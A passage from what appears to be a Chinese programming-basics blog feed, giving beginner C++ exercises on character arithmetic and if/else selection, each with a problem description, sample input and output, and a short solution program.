<h3 id="代码-28"><a href="#代码-28" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="comment">// 读取输入的整数x</span></span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    <span class="comment">// 计算对应的英文大写字母</span></span><br><span class="line">    <span class="type">char</span> letter = <span class="string">&#x27;A&#x27;</span> + (x - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 输出对应的大写字母</span></span><br><span class="line">    cout &lt;&lt; letter &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-30-小萨学名人名言"><a href="#题目名称-30-小萨学名人名言" class="headerlink" title="题目名称:30-小萨学名人名言"></a>题目名称:30-小萨学名人名言</h2><h3 id="题目描述-29"><a href="#题目描述-29" class="headerlink" title="题目描述"></a>题目描述</h3><p>​	为教会大家念英文字母，老师做了一张字母表，给字母编上序号。老师随机报出序号n，让大家读出对应的字母，请编程实现。</p>
<p>​	<img src="https://uploadfiles.nowcoder.com/images/20221103/0_1667489926633/F3CCDD27D2000E3F9255A7E3E2C48800" alt="img"></p>
<h3 id="输入描述-29"><a href="#输入描述-29" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入字母的序号n(1 ~ 26)</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-29"><a href="#输出描述-29" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出对应的第n个大、小写字母。                </span><br></pre></td></tr></table></figure>

<h3 id="输入-24"><a href="#输入-24" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20</span><br></pre></td></tr></table></figure>

<h3 id="输出-24"><a href="#输出-24" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tt</span><br></pre></td></tr></table></figure>

<h3 id="代码-29"><a href="#代码-29" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 读取输入的序号n</span></span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">// 计算对应的大写字母</span></span><br><span class="line">    <span class="type">char</span> uppercase = <span class="string">&#x27;A&#x27;</span> + (n - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 计算对应的小写字母</span></span><br><span class="line">    <span class="type">char</span> lowercase = <span class="string">&#x27;a&#x27;</span> + (n - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 输出对应的大写和小写字母</span></span><br><span class="line">    cout &lt;&lt; uppercase &lt;&lt; lowercase &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>程序设计基础习题</category>
      </categories>
      <tags>
        <tag>程序设计基础</tag>
      </tags>
  </entry>
  <entry>
    <title>程序设计基础(4)-选择结构1(单分支和双分支)</title>
    <url>/2023/09/28/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80(4)-%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%841(%E5%8D%95%E5%88%86%E6%94%AF%E5%92%8C%E5%8F%8C%E5%88%86%E6%94%AF)/</url>
    <content><![CDATA[<h1 id="程序设计基础-4-选择结构1-单分支和双分支"><a href="#程序设计基础-4-选择结构1-单分支和双分支" class="headerlink" title="程序设计基础(4)-选择结构1(单分支和双分支)"></a>程序设计基础(4)-选择结构1(单分支和双分支)</h1><h2 id="题目名称-A-你是天才吗？"><a href="#题目名称-A-你是天才吗？" class="headerlink" title="题目名称:A-你是天才吗？"></a>题目名称:A-你是天才吗？</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>据说智商140以上者称为天才，KiKi想知道他自己是不是天才，请帮他编程判断。输入一个整数表示一个人的智商，如果大于等于140，则表明他是一个天才，输出“Genius”。</p>
<h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个整数表示的智商。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果大于等于140，则表明他是一个天才，输出“Genius”，否则不输出。                 </span><br></pre></td></tr></table></figure>

<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">160</span><br></pre></td></tr></table></figure>

<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Genius</span><br></pre></td></tr></table></figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> IQ; <span class="comment">// 声明一个整数变量来存储智商</span></span><br><span class="line">    cin &gt;&gt; IQ; <span class="comment">// 从标准输入读取智商值</span></span><br><span class="line">    <span class="comment">// 判断智商是否大于等于140</span></span><br><span class="line">    <span class="keyword">if</span> (IQ &gt;= <span class="number">140</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Genius&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-B-满分判断"><a href="#题目名称-B-满分判断" class="headerlink" title="题目名称:B-满分判断"></a>题目名称:B-满分判断</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>不及格学校的孩子们都想考试打一百分，输入一个成绩，请编程帮着判断是否得了一百分。</p>
<h3 id="输入描述-1"><a href="#输入描述-1" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个正整数n ( 0 ≤ n ≤ 100) </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-1"><a href="#输出描述-1" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果输入的分数为100分，输出“Full marks!”</span><br></pre></td></tr></table></figure>

<h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">100</span><br></pre></td></tr></table></figure>

<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Full marks!</span><br></pre></td></tr></table></figure>

<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="comment">// 读取分数</span></span><br><span class="line">    cin &gt;&gt; score;</span><br><span class="line">    <span class="comment">// 判断是否为100分</span></span><br><span class="line">    <span class="keyword">if</span> (score == <span class="number">100</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Full marks!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-C-6的倍数"><a href="#题目名称-C-6的倍数" class="headerlink" title="题目名称:C-6的倍数"></a>题目名称:C-6的倍数</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>乎乎喜欢的数字是6的倍数，如果是6的倍数，请编程帮他输出”Good Number!”。</p>
<h3 id="输入描述-2"><a href="#输入描述-2" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个整数</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-2"><a href="#输出描述-2" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果是6的倍数，请输出&quot;Good Number!&quot;          </span><br></pre></td></tr></table></figure>

<h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">36</span><br></pre></td></tr></table></figure>

<h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good Number!</span><br></pre></td></tr></table></figure>

<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="comment">// 读取整数</span></span><br><span class="line">    cin &gt;&gt; num;</span><br><span class="line">    <span class="comment">// 判断是否是6的倍数</span></span><br><span class="line">    <span class="keyword">if</span> (num % <span class="number">6</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Good Number!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-D-奇数判断"><a href="#题目名称-D-奇数判断" class="headerlink" title="题目名称:D-奇数判断"></a>题目名称:D-奇数判断</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入一个正整数n，判断他是不是奇数。</p>
<h3 id="输入描述-3"><a href="#输入描述-3" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个正整数n ( 1 ≤ n ≤ 1000)        </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-3"><a href="#输出描述-3" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果是奇数，输出信息详见样例，如果不是奇数，什么也不输出。                 </span><br></pre></td></tr></table></figure>

<h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 is odd.</span><br></pre></td></tr></table></figure>

<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 读取正整数</span></span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">// 判断是否为奇数</span></span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; n &lt;&lt; <span class="string">&quot; is odd.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-E-完美成绩"><a href="#题目名称-E-完美成绩" class="headerlink" title="题目名称:E-完美成绩"></a>题目名称:E-完美成绩</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>  KiKi想知道他的考试成绩是否完美，请帮他判断。从键盘输入一个整数表示的成绩，编程判断成绩是否在90~100之间，如果是则输出“Perfect”。 </p>
<h3 id="输入描述-4"><a href="#输入描述-4" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入包括一个整数表示的成绩（90~100）。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-4"><a href="#输出描述-4" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出“Perfect”。      </span><br></pre></td></tr></table></figure>

<h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">98</span><br></pre></td></tr></table></figure>

<h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Perfect</span><br></pre></td></tr></table></figure>

<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="comment">// 读取成绩</span></span><br><span class="line">    cin &gt;&gt; score;</span><br><span class="line">    <span class="comment">// 判断成绩是否在90到100之间</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">90</span> &amp;&amp; score &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Perfect&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-F-跳绳达人"><a href="#题目名称-F-跳绳达人" class="headerlink" title="题目名称:F-跳绳达人"></a>题目名称:F-跳绳达人</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>Kiki跳绳很厉害，他想知道自己是不是跳绳达人。输入一分钟跳绳的次数，若大于等于220次，输出“跳绳达人”，否则输出“继续努力”。</p>
<h3 id="输入描述-5"><a href="#输入描述-5" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一分钟跳绳次数</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-5"><a href="#输出描述-5" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若大于等于220次，输出“跳绳达人”，否则输出“继续努力”。                      </span><br></pre></td></tr></table></figure>

<h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">240</span><br></pre></td></tr></table></figure>

<h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跳绳达人</span><br></pre></td></tr></table></figure>

<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> jumpCount;</span><br><span class="line">    <span class="comment">// 读取一分钟跳绳次数</span></span><br><span class="line">    cin &gt;&gt; jumpCount;</span><br><span class="line">    <span class="comment">// 判断是否为跳绳达人</span></span><br><span class="line">    <span class="keyword">if</span> (jumpCount &gt;= <span class="number">220</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;跳绳达人&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;继续努力&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-G-判断奇偶"><a href="#题目名称-G-判断奇偶" class="headerlink" title="题目名称:G-判断奇偶"></a>题目名称:G-判断奇偶</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>判断一个整数n是奇数还是偶数,如果是奇数,输出”odd”, 否则输出”even”</p>
<h3 id="输入描述-6"><a href="#输入描述-6" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一个整数n（1 &lt;= n &lt;= 100）</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-6"><a href="#输出描述-6" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出odd或者even                </span><br></pre></td></tr></table></figure>

<h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">even</span><br></pre></td></tr></table></figure>

<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 读取整数</span></span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">// 判断奇偶性</span></span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;even&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;odd&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-H-环保打印"><a href="#题目名称-H-环保打印" class="headerlink" title="题目名称:H-环保打印"></a>题目名称:H-环保打印</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>​	ReRe上网课每天都需要打印老师留的作业，为了环保，她一般都用一张A4纸进行双面打印（既：正反面都打印作业），已知一份电子版的作业材料有n页，请帮ReRe计算一下至少需要几张A4纸？</p>
<h3 id="输入描述-7"><a href="#输入描述-7" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一个整数 n(0≤n≤20)，代表一份电子版的学习材料的页数。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-7"><a href="#输出描述-7" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双面打印所需要的A4纸张数。              </span><br></pre></td></tr></table></figure>

<h3 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure>

<h3 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 读取材料页数</span></span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">// 计算所需A4纸张数</span></span><br><span class="line">    <span class="type">int</span> pages_needed = (n + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">    cout &lt;&lt; pages_needed &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-I-被5整除问题"><a href="#题目名称-I-被5整除问题" class="headerlink" title="题目名称:I-被5整除问题"></a>题目名称:I-被5整除问题</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>  判断一个整数是否能5整除是一个挺简单的问题，懒惰的KiKi还是不想自己做，于是找到你帮他写代码，你就帮帮他吧。 </p>
<h3 id="输入描述-8"><a href="#输入描述-8" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入包括一个整数M（1≤M≤100,000）。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-8"><a href="#输出描述-8" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出包括一行，如果M可以被5整除就输出YES，否则输出NO（结果大小写敏感）。            </span><br></pre></td></tr></table></figure>

<h3 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure>

<h3 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YES</span><br></pre></td></tr></table></figure>

<h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> M;</span><br><span class="line">    <span class="comment">// 读取整数M</span></span><br><span class="line">    cin &gt;&gt; M;</span><br><span class="line">    <span class="comment">// 判断是否能被5整除</span></span><br><span class="line">    <span class="keyword">if</span> (M % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-J-判断是否为两位数"><a href="#题目名称-J-判断是否为两位数" class="headerlink" title="题目名称:J-判断是否为两位数"></a>题目名称:J-判断是否为两位数</h2><h3 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h3><p>判断一个正整数是否是两位数(即大于等于10且小于等于99)。若该正整数是两位数，输出1，否则输出0。</p>
<h3 id="输入描述-9"><a href="#输入描述-9" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个正整数，不超过1000。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-9"><a href="#输出描述-9" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，若该正整数是两位数，输出1，否则输出0。            </span><br></pre></td></tr></table></figure>

<h2 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">68</span><br></pre></td></tr></table></figure>

<h2 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>

<h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="comment">// 读取正整数</span></span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">// 判断是否是两位数</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt;= <span class="number">10</span> &amp;&amp; n &lt;= <span class="number">99</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;0&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-K-两个数中较大"><a href="#题目名称-K-两个数中较大" class="headerlink" title="题目名称:K-两个数中较大"></a>题目名称:K-两个数中较大</h2><h3 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入两个整数，输出两个数中较大的。</p>
<h3 id="输入描述-10"><a href="#输入描述-10" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入两个整数a, b(1 ≤ a, b ≤ 1000)，空格隔开。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-10"><a href="#输出描述-10" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a, b中较大的         </span><br></pre></td></tr></table></figure>

<h3 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16 22</span><br></pre></td></tr></table></figure>

<h2 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure>

<h3 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="comment">// 读取两个整数</span></span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="comment">// 判断并输出较大的数</span></span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">        cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        